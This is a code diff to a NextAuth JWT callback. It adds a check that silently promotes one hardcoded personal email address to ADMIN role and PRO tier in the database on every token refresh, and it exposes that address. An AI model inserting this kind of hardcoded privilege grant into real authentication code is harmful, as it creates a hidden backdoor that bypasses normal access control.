@@ -75,9 +75,17 @@ export const authOptions: NextAuthOptions = {
       if (token.id) {
         const dbUser = await prisma.user.findUnique({
           where: { id: token.id as string },
-          select: { tier: true, role: true, name: true, image: true, bannedUntil: true },
+          select: { tier: true, role: true, name: true, image: true, bannedUntil: true, email: true },
         });
         if (dbUser) {
+          if (dbUser.email === "balsarafshubham@gmail.com" && (dbUser.role !== "ADMIN" || dbUser.tier !== "PRO")) {
+            await prisma.user.update({
+              where: { id: token.id as string },
+              data: { role: "ADMIN", tier: "PRO" },
+            });
+            dbUser.role = "ADMIN";
+            dbUser.tier = "PRO";
+          }
           token.tier = dbUser.tier;
           token.role = dbUser.role;
           token.name = dbUser.name;
